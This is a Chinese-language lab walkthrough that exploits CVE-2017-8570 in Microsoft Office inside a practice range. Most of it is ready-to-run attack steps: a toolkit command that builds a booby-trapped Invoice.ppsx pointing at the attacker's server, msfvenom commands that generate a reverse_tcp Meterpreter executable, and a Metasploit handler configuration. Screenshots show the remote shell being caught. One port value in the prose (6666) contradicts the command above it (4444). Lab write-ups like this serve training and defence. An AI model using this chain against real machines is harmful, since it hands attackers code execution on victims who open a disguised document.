---
description: CVE-2017-8570
---

# Microsoft Office远程代码执行漏洞

## 【原理】

该漏洞为Microsoft Office的一个远程代码执行漏洞。其成因是`Microsoft PowerPoint`执行时会初始化`Script”Moniker`对象，而在`PowerPoint`播放动画期间会`激活`该对象，从而执行`sct`脚本（Windows Script Component）文件。攻击者可以欺骗用户运行含有该漏洞的PPT文件，导致获取和当前登录用户相同的代码执行权限。

## 【工具】

* Office
* Python
* kali

## 【步骤】

```text
靶机：
操作系统:windows 7 sp1 x64
Office版本*：Office 专业增强版 2016
ip：192.168.0.103
攻击者Kali：
操作系统：kali2021.4
metasploit版本：msf6
ip：192.168.0.104
```

1.点击启动场景按钮，等待场景启动完成后，通过靶标接入协议进入漏洞标靶

2..生成恶意PPSX文件

```text
cd Office8570   //进入exp文件夹
python cve-2017-8570_toolkit.py -M gen -w Invoice.ppsx -u http://192.168.0.104/logo.doc  
//这里的192.168.0.104是攻击者的ip地址
```

![image-20210222143131040](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210222143131040.png)

3..生成反弹shell 的 exe 文件

```text
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=4444 -f exe > shell.exe
```

`LHOST`是攻击者的`ip`，`LPORT`这里设置的是监听本机的`6666`端口

```text
生成针对x64位系统 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.140 LPORT=6666 -f exe > shell.exe
生成针对32位系统  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.140 LPORT=6666 -f exe > shell.exe
```

![image-20210222143452126](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210222143452126.png)

4.使用EXP监听会话：监听目标打开的Invoice.ppsx执行的shell.exe。需要切换到root用户。

```text
su  //使用root权限
输入密码
python cve-2017-8570_toolkit.py -M exp -e http://192.168.0.104/shell.exe -l shell.exe
```

![image-20210222143645464](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210222143645464.png)

5.再使用msf监听 exp执行的shell.exe，也就是目标打开Invoice.ppsx也就执行了shell.exe。

```text
~ msfconsole

use exploit/multi/handler
set LHOST 192.168.0.104
set LPORT 4444
show options
64位系统 msf > set PAYLOAD windows/x64/meterpreter/reverse_tcp
32位系统 msf > set PAYLOAD windows/meterpreter/reverse_tcp

msf > exploit
```

![image-20210222144104909](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210222144104909.png)

![image-20210222144200944](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210222144200944.png)

![image-20210222144212095](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210222144212095.png)

6.靶机打开Invoice.ppsx

![image-20210222144404718](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210222144404718.png)

![image-20210222144736918](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210222144736918.png)

7.反弹shell拿到权限

![image-20210222144329885](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210222144329885.png)

![image-20210222144514645](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210222144514645.png)

